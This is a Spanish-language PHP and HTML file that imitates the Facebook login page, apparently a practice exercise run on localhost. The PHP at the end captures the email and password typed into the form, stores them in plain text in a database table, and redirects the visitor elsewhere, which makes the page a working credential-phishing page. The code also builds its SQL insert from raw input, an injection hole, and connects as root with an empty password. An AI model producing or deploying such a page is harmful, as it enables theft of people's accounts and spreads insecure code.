<?php
    session_start();
    $servidor = 'localhost';
    $usuario = 'root';
    $clave = '';
    $BaseDeDatos = 'facebook';

    $enlace = mysqli_connect ($servidor, $usuario, $clave, $BaseDeDatos );

?>



<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<link rel="shortcut icon" href="img/icono.ico">
<link rel="preload" href="normalize.css" as="style">
<link rel="stylesheet" href="normalize.css">
<link rel="preload" href="style.css" as="style">
<link rel="stylesheet" href="style.css">
<meta name="viewport" content="width=device-width, initialscale=1.0">
<title>Iniciar sesión en Facebook</title>
</head>


<body>


<main class="bg paddig-main">
<div class="contenedor pd-20 dos-columnas">
<div>
<div class="contenedor-logo">
<img class="logo" src="img/facebook.svg" alt="Logo de facebook">
</div>
<h2 class="eslogan">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
</div> <!-- en este div se puso el logo y mensaje del login -->
<div>



<form  action= "" name="EjemploFacebook" method="post" class="card shadow">

<input type="email" name= "correo" placeholder="correo electrónico o número de teléfono,">

<input type="password" name= "contrasena" placeholder="Contraseña">

<input type="submit" value="iniciar sesión" class="btn-blue" name="iniciar_sesion"> <!--boton para enviar la informacion-->
<a href="#" class="link">¿Olvidaste tu contraseña?</a>
<div class="line"></div>
<input type="submit" value="Crear cuenta nueva" class="btn-green" class="centrado">
</form>
<p class="info"><a href="#" class="bold">Crea una página
</a>para una celebridad,<span class="bloque"></span> una marca o un negocio.</span> </p>
</div>
</div>
</main>




<footer class="contenedor">

<ul class="links">
<li><a href="#">Español</a></li>
<li><a href="#">English (US)</a></li>
<li><a href="#">Português (Brasil)</a></li>
<li><a href="#">Français (France)</a></li>
<li><a href="#">Italiano</a></li>
<li><a href="#">العربية> /a></li>
<li><a href="#">Deutsch</a></li>
<li><a href="#">हिन्दी</a></li>
<li><a href="#">中文(简体)</a></li>
<li><a href="#">日本語</a></li>
</ul>


<div class="line-fo"></div>
<ul class="links">
<li><a href="#">Registrarte</a></li>
<li><a href="#">Iniciar sesión</a></li>
<li><a href="#">Messenger</a></li>
<li><a href="#">Facebook Lite</a></li>
<li><a href="#">Video</a></li>
<li><a href="#">Meta Pay</a></li>
<li><a href="#">Tienda de Meta</a></li>
<li><a href="#">Meta Quest</a></li>
<li><a href="#">Ray-Ban Meta</a></li>
<li><a href="#">Meta AI</a></li>
<li><a href="#">Instagram</a></li>
<li><a href="#">Threads</a></li>
<li><a href="#">Centro de información de votación</a></li>
<li><a href="#">Política de privacidad</a></li>
<li><a href="#">Centro de privacidad</a></li>
<li><a href="#">Información</a></li>
<li><a href="#">Crear anuncio</a></li>
<li><a href="#">Desarrolladores</a></li>
<li><a href="#">Empleo</a></li>
<li><a href="#">Cookies</a></li>
<li><a href="#">Opciones de anuncios</a></li>
<li><a href="#">Condiciones</a></li>
<li><a href="#">Ayuda</a></li>
<li><a href="#">Importación de contactos y no usuarios Configuración</a></li>
</ul>
<p class="copy">Meta © 2025</p>
</footer>


</body>
<?php 
    if(isset($_POST ['iniciar_sesion'])){

    $correo= $_POST['correo'];
    $contrasena= $_POST['contrasena'];


    $insertDatos = "INSERT INTO datos (correo, contrasena) VALUES ('$correo', '$contrasena')";

    $ejecutarInsert= mysqli_query ($enlace, $insertDatos);

    //Codigo para transferir al usuario a otra Página

     if ($ejecutarInsert) {
        echo "<script>
                window.location.href = 'http://127.0.0.1:5500/inicio.html'; //Localizará al usuario a otra pagina
              </script>";
    } 
}
?>

</html>
    
  